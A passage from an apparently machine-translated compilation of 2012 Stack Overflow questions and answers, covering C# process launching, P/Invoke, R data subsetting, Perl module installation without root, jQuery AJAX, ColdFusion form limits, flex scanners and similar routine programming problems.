compiler.StartInfo.WorkingDirectory = "C:\\Test\\";
compiler.StartInfo.Arguments = "/r getpage.bat";
compiler.StartInfo.UseShellExecute = false;
compiler.StartInfo.RedirectStandardOutput = true;
compiler.Start();

File.WriteAllText("C:\\Test\\pageoutput.txt",compiler.StandardOutput.ReadToEnd());

compiler.WaitForExit(); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-19T17:04:51.783

您将 bat 位置指定为文件名而不是 cmd.exe

```
Process compiler = new Process();
compiler.StartInfo.FileName = "C:\\Test\\getpage.bat"; 
compiler.StartInfo.UseShellExecute = true;
compiler.Start(); 
```

虽然我没有看到对 bat 文件的具体需求。你可以这样做：

```
Process compiler = new Process();
compiler.StartInfo.FileName = DirectoryToPhantomJs + "phantomjs"; 
compiler.StartInfo.Arguments = "--config=config.json netsniff.js http://google.com ";
compiler.StartInfo.UseShellExecute = true;
compiler.Start(); 
```

第二种方法的好处是您明确指定了 phantom js 的位置，因此您*不应该*收到“phantom.js 未被识别为内部或外部命令”错误。

# java - Java play 1.2.5 - Reverse routing to subpackage of controllers

> ID：13957391
> 
> 赞同：2
> 
> 时间：2012-12-19T17:01:40.883
> 
> 标签：java, playframework, routes, playframework-1.x

Is it possible to put a controller from package controllers to package controllers.subpackage and get the reverse routing in play 1.2.5 working?

Adding

```
GET     /myMethod           controllers.subpackage.MyController.myMethod 
```

to conf/routes works fine but if I call

```
Router.reverse("controllers.subpackage.MyController.myMethod") 
```

in Application.java it fails to compile, saying "No route found".

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-20T08:58:20.013

事实上，您的路线定义应该是：

```
GET     /myMethod           subpackage.MyController.myMethod 
```

然后反过来就好了

```
Router.reverse("subpackage.MyController.myMethod") 
```

# php - Always get the correct datetime?

> ID：13957395
> 
> 赞同：1
> 
> 时间：2012-12-19T17:01:58.653
> 
> 标签：php, mysql

I was wondering if there is any API/way/site/link that provides the correct time?

Not the servers datetime or the clients datetime. I'm using datetime to count down on my gaming site for when it is the user's time to make a play. Users come from all over the world, so using their client time would not match if it's from the US to Europe.

Then normally I would use the servers time, but somehow it skips 1.2 hours sometimes? I would like to make sure that everbody makes a timestamp from the same source and that source is always correct!

Any ideas?

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-19T17:10:58.560

首先，您应该在客户端和服务器代码中使用[UTC](http://en.wikipedia.org/wiki/Coordinated_Universal_Time)以避免时区问题。

此外，我以某种方式理解您的问题，即时间准确（纳秒）正确并不重要，更重要的是，服务器和客户端上的时间相同。

因此，客户端和服务器都需要该 UTC 时间的唯一来源。这绝对应该是**您的服务器**。我可以建议将您的服务器用作客户端的 NTP 服务器。但是假设您在网络环境中，这听起来不切实际。

所以我建议为来自服务器的每条消息添加一个时间戳 - UTC 时间。客户必须使用此时间戳作为参考。Additonaly 可以让客户端通过调用你的服务器来定期更新他们的时间。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-19T17:13:38.590

使用服务器的时间很好，只需确保正确获取时区：

```
$now = new DateTime;
$now->setTimeZone(new DateTimeZone("Europe/London")); 
```

现在，`$now`将包含一个 DateTime 对象，以及伦敦的正确时间。

PHP 在夏令时和奇怪的自定义时间事件方面做得很好。

# jquery - 从Rails jquery-file-upload中的formData检索数据

> ID：13957397
> 
> 赞同：0
> 
> 时间：2012-12-19T17:02:05.977
> 
> 标签：jquery, ruby-on-rails, form-data

我正在尝试使用[https://github.com/blueimp/jQuery-File-Upload/wiki/How-to-submit-additional-form-data](https://github.com/blueimp/jQuery-File-Upload/wiki/How-to-submit-additional-form-data)添加其他表单数据，本教程用于我的 jQuery-File-Upload 插件轨道应用程序。

我正在按照在上传开始时为每个单独的文件上传设置 formData 的说明进行操作。

我的问题是，在按照教程中的说明保存文件及其标题后，我无法在最终表格中显示它们，因为我不知道如何达到 formData 的值。

我应该如何获取里面的数据 `data.formData = inputs.serializeArray();`并将它们发布在每个项目旁边？

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-19T17:58:30.947

我相信这些数据将作为`params`控制器内部的一部分包含在内。

# ios - 在 iOS 中处理视频中的特定配乐

> ID：13957407
> 
> 赞同：2
> 
> 时间：2012-12-19T17:02:15.210
> 
> 标签：ios, video

有谁知道，如果 iOS 有机会解决视频中的特定配乐？我有一个 .mov 文件，其中包含两个配乐（不同的语言）。我浏览了 MPMoviePlayer 和 AVPlayer 类，但我找不到任何东西-

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-08-17T02:09:30.490

使用 AVFoundation，[AVAssetTrack](https://developer.apple.com/library/mac/documentation/AVFoundation/Reference/AVAssetTrack_Class/Reference/Reference.html)就是您所寻找的。

# r - 子集不平衡（异类复制）以完成或平衡 r 中的数据集

> ID：13957411
> 
> 赞同：11
> 
> 时间：2012-12-19T17:02:22.870
> 
> 标签：r, dataframe

我有一个重复次数不等的数据集。我想通过删除那些不完整的条目（即复制小于最大值）来对数据进行子集化。只是一个小例子：

```
set.seed(123)
mydt <- data.frame (name= rep ( c("A", "B", "C", "D", "E"), c(1,2,4,4, 3)), 
                   var1 = rnorm (14, 3,1), var2 = rnorm (14, 4,1))
 mydt
       name     var1     var2
1     A 2.439524 3.444159
2     B 2.769823 5.786913
3     B 4.558708 4.497850
4     C 3.070508 2.033383
5     C 3.129288 4.701356
6     C 4.715065 3.527209
7     C 3.460916 2.932176
8     D 1.734939 3.782025
9     D 2.313147 2.973996
10    D 2.554338 3.271109
11    D 4.224082 3.374961
12    E 3.359814 2.313307
13    E 3.400771 4.837787
14    E 3.110683 4.153373 
```

摘要(mydt)

```
name       var1            var2      
 A:1   Min.   :1.735   Min.   :2.033  
 B:2   1st Qu.:2.608   1st Qu.:3.048  
 C:4   Median :3.120   Median :3.486  
 D:4   Mean   :3.203   Mean   :3.688  
 E:3   3rd Qu.:3.446   3rd Qu.:4.412  
       Max.   :4.715   Max.   :5.787 
```

我想从数据中删除 A、B、E，因为它们不完整。因此预期的输出：

```
name     var1     var2
4     C 3.070508 2.033383
5     C 3.129288 4.701356
6     C 4.715065 3.527209
7     C 3.460916 2.932176
8     D 1.734939 3.782025
9     D 2.313147 2.973996
10    D 2.554338 3.271109
11    D 4.224082 3.374961 
```

请注意数据集很大，以下可能不是一个选项：

```
mydt[mydt$name == "C",]
mydt[mydt$name == "D", ] 
```

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-12-19T17:20:56.803

这是使用的解决方案`data.table`：

```
library(data.table)
DT <- data.table(mydt, key = "name")
DT[, N := .N, by = key(DT)][N == max(N)]
#    name     var1     var2 N
# 1:    C 3.070508 2.033383 4
# 2:    C 3.129288 4.701356 4
# 3:    C 4.715065 3.527209 4
# 4:    C 3.460916 2.932176 4
# 5:    D 1.734939 3.782025 4
# 6:    D 2.313147 2.973996 4
# 7:    D 2.554338 3.271109 4
# 8:    D 4.224082 3.374961 4 
```

`.N`为您提供每组的案例数量，并使用`data.table`' 选项来*复合查询*，您可以根据您希望从这个新变量中获得的任何条件立即进行子集化。

在基础 R 中也有几种方法，其中最明显的是`table`：

```
with(mydt, mydt[name %in% names(which(table(name) == max(table(name)))), ]) 
```

可能不太常见，但与建议的方法相似`data.table`，是使用`ave()`：

```
counts <- with(mydt, as.numeric(ave(as.character(name), name, FUN = length)))
mydt[counts == max(counts), ] 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-19T18:04:23.437

这是一个简单的方法，不需要创建额外的数据结构

```
tabl <- table(mydt[,1])
toRemove <- names(which(tabl < max(tabl)))
mydt[!mydt[,1] %in% toRemove, ]

     #    name     var1     var2
     # 4     C 3.070508 2.033383
     # 5     C 3.129288 4.701356
     # 6     C 4.715065 3.527209
     # 7     C 3.460916 2.932176
     # 8     D 1.734939 3.782025
     # 9     D 2.313147 2.973996
     # 10    D 2.554338 3.271109
     # 11    D 4.224082 3.374961 
```

* * *

### 作为单行：

```
 mydt[!mydt[,1] %in% names(which(table(mydt[,1]) < max(table(mydt[,1])))), ] 
```

# c# - Pinvoke-使用指向指针参数的指针调用函数

> ID：13957412
> 
> 赞同：2
> 
> 时间：2012-12-19T17:02:24.627
> 
> 标签：c#, pointers, struct, pinvoke, union

我在 C 中有一个带有这个签名的函数：

```
int addPos(int init_array_size, 
           int *cnt, 
           int *array_size, 
           PosT ***posArray, 
           char *infoMsg); 
```

这是 PostT 的样子：

```
typedef union pu
{
    struct  dpos   d;
    struct  epo    e;
    struct  bpos   b;
    struct  spos   c;
} PosT ; 
```

通过 P/Invoke 在 C# 中调用此方法的最佳方法是什么？我需要在 C# 中定义一个代表 PostT 的类吗？如何将 PosT ***posArray 参数从 C# 传递到 C？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-19T18:28:30.040

您已经描述了 PostT 的外观，但这还不够。首先，必须知道函数期望作为 ***PostT 参数传递的内容，然后才能考虑从 C++ 或 C# 端调用它。

我知道这可能不符合您的意愿，但请看：

```
PosT p;
PosT* ptr = &p;
PosT** ptr2 = &ptr;
PosT*** ptr3 = &ptr2;
func(...., ptr3, ...); // OK!?

PosT* ptr = new PosT[123];
PosT** ptr2 = &ptr;
PosT*** ptr3 = &ptr2;
func(...., ptr3, ...); // OK!?

PosT** ptr2 = new PosT[5];
for(int i=0;i<5;++i) ptr2[i] = new PosT[123];
PosT*** ptr3 = &ptr2;
func(...., ptr3, ...); // OK!?? 
```

等等。我快速构建的哪个内存结构对于该功能是正确的？这*决定*了您必须从 C# 端传递的数据类型。

如果该函数采用您称为“对锯齿状阵列的可变引用”的东西（所以我提供的最后一个示例），那么 P/Invoke 声明将是：

```
[..extern..]
void func(....., ref PosT[][] posArray, ...); 
```

调用类似于：

```
func(...., new PosT[][] { 
         new PosT[] { new PosT{ d = ... }, new PosT{ d = ... }, ... },
         new PosT[] { new PosT{ d = ... }, new PosT{ d = ... }, ... },
         ... },
    .... ); 
```

但是，请先检查这个函数的期望。有了***真的有太多的可能性只是猜测。你说它来自一些 API - 首先检查它的文档！告诉我们这个函数到底需要什么，我/有人会告诉你如何在 C# 中构建这样的 POD。反之则行不通！:)

PS。对不起，糟糕的 C++/C# 代码，我很匆忙，只有几分钟的时间来写这个：/

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-19T20:43:10.837

**问题 #1 我需要在 CSharp 中定义一个代表 PostT 的类吗？**
您应该将 PostT 定义为 c# 中的结构。由于这是一个联合结构，您将需要应用 StructLayout 属性，并完全定义您的其他结构。它可能看起来像这样：

```
struct  dpos { };
struct  epo  { };
struct  bpos { };
struct  spos { };
[System.Runtime.InteropServices.StructLayout(
    System.Runtime.InteropServices.LayoutKind.Explicit, Size=99)]
struct PosT {
    [System.Runtime.InteropServices.FieldOffset(0)] dpos   d;
    [System.Runtime.InteropServices.FieldOffset(0)] epo    e;
    [System.Runtime.InteropServices.FieldOffset(0)] bpos   b;
    [System.Runtime.InteropServices.FieldOffset(0)] spos   c;
    }; 
```

** 请注意，“Size=99”**不**正确。理想情况下，您应该将此大小设置为最大封闭结构使用的字节数。

**问题 #2- 我如何将 Post *** posArray 参数通过 frm CSharp 传递给 C？**
你必须非常小心地做这种事情，特别是如果你希望在 C# 下为 posArray 分配内存。您不想将 .NET GC 即将移动/更改的缓冲区传递给 C。如果 C 返回缓冲区，你应该没问题（但如果没有 C 函数让你释放内存，你会泄漏内存）。你应该看看[Default Marshaling for Arrays](http://msdn.microsoft.com/en-us/library/z6cfh6e6%28v=vs.80%29.aspx)和 www.pinvoke.net 可能有一些例子。如果您将 posArray 缓冲区从 C# 发送到 C，您将不得不求助于不安全的上下文（见下文）。我不确定如何处理该级别或重定向。您的 cnt 和 array_size 可以使用 'ref' 关键字来处理。

**问题 #3- 我如何为这一切指定封送处理？**
看看上面的链接，尤其是数组的默认封送处理。您可能还需要使用一些测试代码，在调用后中断并使用即时窗口来调查结构。

* * *

**记住**

如果您使用“UNSAFE”开关编译 c#，您几乎可以直接（类似 c）调用。例如：

```
unsafe public MainWindow() {
    InitializeComponent();
    int abc = 4;
    int* abcPtr = &abc;
    *abcPtr = 8;

    fixed (PosT* gog = new PosT[30]) {
        PosT* gogPtr = (gog + 1);
        }
    } 
```

你必须***非常***小心，因为 C# 管理它自己的内存并且可以在你身上移动东西（参见上面的“固定”）。我不推荐这个，但它对于快速和肮脏的事情很有用

此外，如果 API 在 tlb（表库）中定义，Visual Studio 通常会提供通过存根 dll 为您创建绑定（请参阅 tlbimp 命令）

* * *

希望有人可以提供更具体的回应，但我认为这些信息至少可以让你开始前进。

# python - Selenium 测试套件只打开一次浏览器

> ID：13957413
> 
> 赞同：1
> 
> 时间：2012-12-19T17:02:25.130
> 
> 标签：python, selenium

我们有一套 selenium 测试，在设置和拆卸时打开和关闭浏览器以开始新的测试。

这种方法需要很长时间才能运行测试，因为打开和关闭速度很慢。有没有办法在构造函数中打开浏览器一次，然后在拆卸时重新设置和清理，然后在解构函数中关闭浏览器？

任何例子都会非常感激。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-19T17:05:15.797

您可以使用类或模块级别的设置和拆卸方法，而不是测试级别的设置和拆卸。不过要小心这一点，就好像您没有在每次测试中明确重置测试环境一样，您必须在每次测试之前手动清理所有内容（cookie、历史记录等），并在浏览器崩溃时恢复浏览器。

# ios - 应用 CABasicAnimaton 后，UIButton 在错误的位置接收到触摸

> ID：13957414
> 
> 赞同：1
> 
> 时间：2012-12-19T17:02:27.437
> 
> 标签：ios, events, uibutton, touch, cabasicanimation

我需要向 UIButton 添加动画 - 简单的移动动画。当我这样做时，按钮会移动，但该按钮的点击区域仍保持在旧位置：

```
UIButton *slideButton = [UIButton buttonWithType:UIButtonTypeRoundedRect];
[slideButton addTarget:self action:@selector(clicked:) forControlEvents:UIControlEventTouchUpInside];
[slideButton setFrame:CGRectMake(50, 50, 50, 50)];
[self.view addSubview:slideButton];

CABasicAnimation *slideAnimation = [CABasicAnimation animationWithKeyPath:@"position"];
[slideAnimation setRemovedOnCompletion:NO];
[slideAnimation setDuration:1];
[slideAnimation setFillMode:kCAFillModeBoth];
[slideAnimation setAutoreverses:NO];

slideAnimation.fromValue = [NSValue valueWithCGPoint:CGPointMake(50, 50)];
slideAnimation.toValue = [NSValue valueWithCGPoint:CGPointMake(100, 100)];
[slideButton.layer addAnimation:slideAnimation forKey:@"slide"]; 
```

我已经看到了在动画结束时更改按钮框架的答案（就像这里[UIButton 在 CABasicAnimaton 之后的错误位置接收 touchEvents](https://stackoverflow.com/questions/11395335/uibutton-receives-touchevents-at-the-wrong-position-after-a-cabasicanimaton)）但这不是我的情况，因为我应该让用户有可能在单击按钮时单击按钮它正在移动......另外，我不能使用其他方法（如 NSTimer）作为 CABasicAnimation 的替代品，因为我将有一个复杂的路径来移动对象......

感谢您的帮助！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-20T15:14:03.757

好吧，我发现它与 CABasicAnimation 不太可能有关。Coz 动画循环在视图中为图层对象设置动画，但视图本身保持不变，无论 CABasicAnimation 对象设置了什么属性。

经过几个小时的谷歌搜索，我发现了 MICHAEL TYSON 开发的一个很酷的功能：http: [//atastypixel.com/blog/key-path-based-property-animation/](http://atastypixel.com/blog/key-path-based-property-animation/)

我对其进行了一些改进 - 添加了：autoreverse、repeatCount、cumulative、timeOffset、byValue .. 瞧！几乎相同的 CABasicAnimation - 但能够动画帧！

# c - eventfd 是否有 Windows 等效项？

> ID：13957415
> 
> 赞同：3
> 
> 时间：2012-12-19T17:02:29.097
> 
> 标签：c, windows, events, cross-platform, select-function

**我正在编写一个模拟套接字行为的跨平台库，**在两者之间（App->mylib->sockets）具有附加功能。

**我希望它对程序员来说**是最透明的，所以****像 select 和 poll 这样的原语必须与这个 lib 相应地工作**。**

 **问题是当数据在真实套接字中变得可用时（例如），它必须经过大量处理，所以如果 select 指向真实套接字 fd，应用程序将被阻塞很多时间。我希望仅在准备好使用数据时（在我的库完成所有处理之后）解除阻塞选择/轮询。

所以我遇到了这个**eventfd**，它允许我做我想做的事，即**操纵给定 fd 上的选择/轮询行为**。

由于我更熟悉 Linux 环境，我不知道**windows 相当于 eventfd 是什么**。试图搜索但没有运气。

**注意：** 其他方法是使用与接口连接的另一个套接字，但这似乎开销很大。仅仅因为windows没有（看起来如此）这个功能而对所有数据进行系统调用。

或者我可以实现我自己的选择，重新发明轮子。=/

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-19T20:48:45.003

是的，但这很荒谬。您可以制作一个分层服务提供者（全局安装......）来摆弄系统的网络堆栈。您可以自己实现所有 WinSock2 函数，并将其中大部分转发到底层 TCP。这通常被防火墙或防病毒程序用来将自己插入堆栈并查看发生了什么。

在您的情况下，您希望使用 ioctl 为您的应用程序打开“特殊”行为。每当应用程序尝试创建一个套接字时，它都会被转发到您的函数，该函数又会打开一个真正的 TCP 套接字（比如说）。但是，您没有返回该 HANDLE，而是使用 WinSock 函数从内核创建请求一个虚拟句柄，并将其提供给应用程序。你在一个线程中做你的事情。然后，当应用程序在虚拟句柄上调用 WinSock 函数时，它们最终会出现在您的读取、选择等的实现中。您可以将虚拟句柄上的选择通知与实际句柄上的通知分离。这让您可以做一些事情，例如，透明地为应用程序提供一个套接字，该套接字以加密的方式以各种方式包装数据，与原始套接字没有区别。（几乎无法区分！

相当重量级，在某些方面是可怕的。但是，它就在那里......希望这是一个有用的概述。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-19T18:50:15.633

空无一人。`eventfd`是 Linux 特有的特性——它甚至在其他 UNIXy 操作系统上都不可用，例如 BSD 和 Mac OS X。**

# wcf - 如何从 WCF 流式传输并非源自文件系统的文件。（共享点内容数据库）

> ID：13957423
> 
> 赞同：0
> 
> 时间：2012-12-19T17:02:56.717
> 
> 标签：wcf, sharepoint, filestream, memorystream

我正在尝试使用 REST 样式的 URL 而不是 SOAP 在 WCF 3.5 中返回一个流。想法是从 SharePoint 2010 读取文件，然后将其传递回客户端。（我们有理由这样做而不是使用 SharePoint 服务，但我离题了。）似乎发送文件的唯一方法是使用 one 将其写入文件系统`FileStream`，然后使用`File.OpenRead`将流返回到客户。使用 a`MemoryStream`似乎不起作用。IE 提示保存文件，但文件像 2KB 一样下降，然后当然无法读取，因为它不是全部。有任何想法吗？

```
SPListItemCollection lookupFld2 = docLibrary.GetItems(spQuery2);  

if (lookupFld2.Count > 0)
{
    WebOperationContext.Current.OutgoingResponse.ContentType = 
      "application/octet-stream";

    WebOperationContext.Current.OutgoingResponse.Headers.Add(
      "Content-Disposition","attachment; filename=" + lookupFld2[0].File.Name);

    MemoryStream memoryStream = 
      (MemoryStream)lookupFld2[0].File.OpenBinaryStream();

    memoryStream.Position = 0;

    return memoryStream;
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-20T18:53:29.753

从技术上讲，OpenBinaryStream 仅返回一般 Stream 实例而不是 MemoryStream (http://msdn.microsoft.com/en-us/library/ms470901.aspx)。如果你想要一个 MemoryStream，你需要创建一个新的并将 BinaryStream 中的内容复制到 MemoryStream 中，然后重置位置并返回它。

# perl - 使用非 root 和没有 CPAN 安装 Perl 模块和依赖项

> ID：13957431
> 
> 赞同：3
> 
> 时间：2012-12-19T16:10:17.613
> 
> 标签：perl, module

我一直在为我的工作编写 Perl 脚本，而我工作的机器使安装 Perl 模块变得困难：

*   出于安全原因，我们不能`gcc`在我的机器上安装，所以对于大多数模块，我不能使用 CPAN 安装模块。
*   我无权访问 root 帐户。

通常，当我想安装一个模块时，我会提出一个请求，我必须等待一两天才能安装它。我知道没有人会对我自己安装它们有任何问题，所以为了节省大家的时间和我的理智，我想自己安装它们。这只是如何最好地做到这一点的问题。我已经和很多人谈过了，他们说要使用 RPM 来安装它们（以解决没有 RPM 的问题`gcc`）。但是，当尝试从 RPM 安装模块时，它不处理依赖项，因此我需要手动处理依赖项，这可能需要一段时间。

我怎样才能最好地安装具有这些限制的 Perl 模块？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-19T17:46:15.583

在具有类似构建 Perl 的类似机器上，使用以下命令安装模块

```
mkdir ~/foo
cpan
o conf makepl_arg 'PREFIX=~/foo LIB=~/foo/lib/perl5'
o conf mbuildpl_arg '--prefix ~/foo --lib ~/foo/lib/perl5'
install Some::Module 
```

只要您不这样做`o conf commit`，配置更改将是暂时的，所以不要这样做。

复制`~/foo`并设置 env var`PERL5LIB`以包含 LIB 目录。您可以将新模块合并`~/foo`到旧模块中以添加新模块。

这不会安装模块所依赖的任何非 Perl 库。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-19T18:33:09.073

另请参阅[如何保留自己的模块/库目录？](http://perldoc.perl.org/perlfaq8.html#How-do-I-keep-my-own-module%2flibrary-directory%3f)在 Perl FAQ 的第 8 节中。

> 当你构建模块时，告诉 Perl 在哪里安装模块。
> 
> 对于`Makefile.PL`基于 - 的分布，在生成s`INSTALL_BASE`时使用该选项：`Makefile`
> 
> ```
> perl Makefile.PL INSTALL_BASE=/mydir/perl 
> ```
> 
> 对于`Build.PL`基于 - 的发行版，请使用以下`--install_base`选项：
> 
> ```
> perl Build.PL --install_base /mydir/perl 
> ```
> 
> `INSTALL_BASE`告诉这些工具将您的模块放入`/mydir/perl/lib/perl5`. 请参阅[如何`@INC`在运行时将目录添加到我的包含路径 ( )？](http://perldoc.perl.org/perlfaq8.html#How-do-I-add-a-directory-to-my-include-path-(%40INC)-at-runtime%3f)有关如何运行新安装的模块的详细信息。
> 
> 但是，有一个警告`INSTALL_BASE`，因为它与旧版本所提倡的`PREFIX`和`LIB`设置不同。不支持在同一目录下安装多个版本的 Perl 或不同架构的模块。您应该考虑是否真的需要，如果需要，请使用旧的和设置。有关详细信息，请参阅 ExtUtils::Makemaker 文档。`ExtUtils::MakeMaker``INSTALL_BASE``PREFIX``LIB`

# jquery - 通过 JQuery AJAX 将表单响应加载到 div

> ID：13957432
> 
> 赞同：2
> 
> 时间：2012-12-19T17:03:41.787
> 
> 标签：jquery, ruby-on-rails-3.1

我正在开发一个用于文档协作的应用程序。我可以很好地加载视图和编辑部分的模板，但发布有 1 个小障碍。表单有点不同，因为它们使用动作而不是 href。响应正是我想要的（我可以使用 chrome 开发工具看到它）并且响应字符串附加到正确的 div 然后在 ajaxComplete 时删除。如果我将表单操作视为 href，除了正确的响应外，我还会收到缺少的模板 500 响应。

任何人都知道将表单响应加载到 DOM 中的最后一步是什么？这是我的 ajax 成功函数：

```
$('section')
.live('ajax:success', function(event, data, status, xhr) {
  $('#' + response_str).html(data);
}); 
```

值得一提的是，显示和编辑使用，`e.preventDefault()`然后`.load()`在捕获链接href 后使用。我不能用它来发布，因为它会搞砸表单操作。

这是我的展示、编辑和发布功能。

```
// .live() because edit btn is an ajax loaded element
$('[id^=edit_s]').live('click', function(e) { 
  e.preventDefault();
  target = $(this).attr('href');
  sectionID = $(this).attr('id').match(/[\d]+$/);
  sectionLayer = $(this).attr('data-target');
  response_str = 'response_s' + sectionID;
  appropriateDiv.addClass(response_str);
  $("." + response_str).load(target);
});

//this could stand to be less ambigious. select the actual form for example.
$('[id^=publish_s]').live('click', function(e) {
  target = $(this).closest('form').attr('action');
  alert(target);
  appropriateDiv.addClass(response_str);
  $(this).addClass('disabled');
  //$("." + response_str).load(target); // doesn't work!
});

$('[id^=show_s]').live('click', function(e) {
  target = $(this).attr('href');
  sectionID = $(this).attr('id').match(/[\d]+$/);
  sectionLayer = $(this).attr('data-target'); // contains "#"
  appropriateDiv = $('div.tab-pane' + sectionLayer);

  // Don't need preventDefault() if tab since bootstrap does it
  if($(this).attr('data-toggle') != "tab") {
    e.preventDefault();
    appropriateDiv.removeClass('loaded');
  }

  response_str = 'response_s' + sectionID;
  if ($(appropriateDiv).hasClass('loaded')) {
    //alert("Already loaded, bro");
  } else {
    appropriateDiv.addClass(response_str + ' loaded');// ensure AJAX fills the right section
    $("." + response_str).load(target);
  }
}); 
```

提前致谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-19T18:40:44.000

原来是一个愚蠢的错误。在我的成功函数中，我选择的是 ID 而不是类（告诉你这很愚蠢）。

显示和编辑工作的原因是因为`.load()`包括将响应放入所选元素（duh）。

# jquery - 如何创建一个 3 级垂直风琴菜单，其图标可以打开和关闭 1 级和 2 级，同时保持实际链接可点击？

> ID：13957442
> 
> 赞同：2
> 
> 时间：2012-12-19T17:04:08.043
> 
> 标签：jquery, menu, accordion

我在这里找到了这个小提琴：http: [//jsfiddle.net/aCaEG/](http://jsfiddle.net/aCaEG/)来自上一篇文章。

我需要的是有一个向上向下箭头的图标，如手风琴，人们单击以打开和关闭菜单级别，但也有实际链接转到他们的目的地，而不是打开手风琴。

有人知道如何实现这一目标吗？

谢谢

HTML：

```
<ul>
    <li>
        <a href="#" title="#">level 1</a>
        <ul>
            <li>
                <a href="#" title="#">level 2</a>
                <ul>
                    <li><a href="#" title="#">level 3</a></li>
                    <li><a href="#" title="#">level 3</a></li>
                </ul>
            </li>
        </ul>
    </li>
</ul> 
```

CSS：

```
ul{
    margin:3px;
    border:1px solid red;  
}
ul ul{
    display:none;   
}
ul li:hover>ul{
    /*display:block;   */
} 
```

JS：

```
$('li').click(function(ev) {
    $(this).find('>ul').slideToggle();
    ev.stopPropagation();
}); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-19T17:14:30.337

javascript 和 HTML 的细微变化：

HTML - 您想为向下箭头添加跨度或链接：

```
level 2 <span class="open">v</span> 
```

JS：

```
$('li span.open').click(function(ev) {
    $(this).next('ul').slideToggle();
    ev.stopPropagation();
});​ 
```

新小提琴：http: [//jsfiddle.net/QhXR9/](http://jsfiddle.net/QhXR9/)

# coldfusion - 您可以提交的表单域的数量是否有限制？

> ID：13957445
> 
> 赞同：5
> 
> 时间：2012-12-19T17:04:12.953
> 
> 标签：coldfusion

我有一个相当长的表格（1000 个复选框），客户通过它来订购。但是当它超过一定的限制（100 项）时，我收到以下错误：

> 未能添加 HTML 标头。ColdFusion 无法将您指定的标头添加到输出流。这可能是因为您已经在模板中使用了 cfflush 标记或缓冲输出已关闭

问：这是 IIS 设置还是 ColdFusion 管理员设置？

在发布这个问题之前我做了一些研究，它与 AJAX 和调试设置无关。所有调试设置都已关闭，我收到表单提交错误。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-12-19T17:16:44.363

您的表单是 POST 还是 GET？如果是 GET，您可能会超出 URL 长度限制。如果是 POST，那么您可能会遇到 CF 中表单字段数量的限制。[本文](http://web.archive.org/web/20160429073222/https://helpx.adobe.com/coldfusion/kb/coldfusion-security-hotfix.html)详细介绍了如何修改该值。

您可能需要考虑将数据发送到服务器的其他方式。也许使用 jQuery 序列化表单并将 JSON 作为单个参数发送？

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-12-19T17:19:36.337

听起来与我们将具有大量字段的站点移动到新环境后遇到的错误非常相似。我们的错误读起来有点不同，但根据你在做什么，你可能会得到不同的错误。

# 500

> 根本原因：coldfusion.filter.FormScope$PostParametersLimitExceededException：POST 参数超过了服务器中指定的最大限制。

您的 runtime.xml 文件中有一个 Coldfusion 设置，您可以尝试更改或删除：

```
<var name='postParametersLimit'><number>100.0</number></var> 
```

# c# - CSV 文件下载在 ie8/9 中被忽略

> ID：13957447
> 
> 赞同：10
> 
> 时间：2012-12-19T17:04:17.653
> 
> 标签：c#, asp.net, internet-explorer-9, webforms

我在按钮单击事件中有一些代码，它从隐藏的输入中获取 csv 字符串并将其作为 CSV 文件写入响应。

这在 Chrome、Firefox、ie7、ie9 的怪癖模式下工作正常。但是，它在 ie8 或 ie9 默认情况下不起作用。

在 fiddler 中查看这个 csv 正在写入响应，但另一个 get 请求在之后立即发出并且页面重新加载。没有文件保存对话框出现。

```
 protected void btnCsvHidden_Click(object sender, EventArgs e)
    {
        var csv = csvString.Value;
        var filename = "Reporting";

        Response.Clear();
        Response.ClearHeaders();
        Response.AddHeader("Cache-Control", "no-store, no-cache");
        Response.AddHeader("content-disposition", "attachment; filename=\"" + filename + ".csv\"");
        Response.ContentType = "text/csv";
        Response.Write(csv);
        Response.End();
    } 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-19T23:01:20.323

问题出在我自己的 IE 上，我运行了大量的 Windows 更新，现在它可以工作了，所以我不确定它到底是什么。

# c - 具有起始条件的弹性可重入

> ID：13957454
> 
> 赞同：3
> 
> 时间：2012-12-19T17:04:47.587
> 
> 标签：c, bison, yacc, flex-lexer

我正在尝试制作一个依赖于启动条件的可重入扫描仪。

我一直在关注类似于这个家伙的问题：

[使用 Flex 编写可重入词法分析器](https://stackoverflow.com/questions/2634998/writing-re-entrant-lexer-with-flex)

`yyscan_t`正如一张海报所提到的，如果您明确创建并将其作为额外参数传递，扫描仪将起作用。但是，当我使用等来操作启动条件时，我仍然会收到`yyg undeclared`错误消息。`BEGIN <sc>`

这是一个错误吗？我应该明确地使用`yy_push_state`and `yy_pop_state`state 函数吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-19T20:01:04.520

看起来当您使用时，`%option reentrant`您只能在词法分析器的操作部分中使用`BEGIN`和`YY_START`，而不能在代码部分中使用。操作解析器状态需要访问解析器状态是有意义的，但`BEGIN`不接受任何参数，因此无法提供它。使用`%option stack`and `yy_push`/`pop_state`似乎是一个合理的解决方法。

# gnuplot - gnuplot上的相关系数

> ID：13957456
> 
> 赞同：5
> 
> 时间：2012-12-19T17:05:02.427
> 
> 标签：gnuplot, regression, correlation

我想使用拟合函数绘制数据：`function f(x) = a+b*x**2`。绘制后我有这个结果：

```
correlation matrix of the fit parameters:

               m      n      
m               1.000 
n              -0.935  1.000 
```

我的问题是：如何在 gnuplot 上找到相关系数？

* * *

